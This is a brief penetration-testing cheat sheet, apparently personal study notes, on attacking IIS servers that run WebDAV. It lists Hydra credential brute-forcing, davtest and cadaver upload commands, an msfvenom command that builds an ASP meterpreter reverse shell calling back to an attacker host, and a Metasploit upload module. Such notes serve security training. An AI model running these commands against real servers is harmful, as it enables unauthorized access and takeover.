IIS Stands for Internet Information Services. It is a web server developed by Microsoft for Windows. It can handle static pages and dynamic pages developed in ASP.NET or php.

WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the [[HTTP]] Protocol. Il basically enables a webserver to function as a file server with versioning. It normally requires credentials.

# Tools
+ [[Nmap]]
	+ WebDAV detection script
		+ `http-webdav-enum`
		+ `http-enum`
+ [[Hydra]]
	+ Can bruteforce WebDAV
		+ `hydra -L logins -P passwords IP http-get /webdav_folder/`
+ [[davtest]]
	+ Basic test :
		+ `davtest -url URL/folder -auth user:pass`
		+ Uploads and tries to execute various test files
	+ File upload :
		+ `--uploadfile file --uploadloc /folder/`
+ [[cadaver]]
	+ Utility to upload/download/edit files on a WebDAV server
	+ `cadaver URL/webdav_folder/`
	+ Gives a pseudoshell to execute commands
		+ `ls` to list files
		+ `put` to upload a file
+ [[Metasploit]]
	+ Generate ASP payload
		+ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp > shell.asp`
		+ Then, upload, create handler and run
	+ In msfconsole directly :
		+ `exploit/windows/iis/iis_webdav_upload_asp`
# Attacks
+ If WebDAV is enabled, and credentials can be obtained, a php or asp reverse shell can be uploaded and used to gain access to the server. 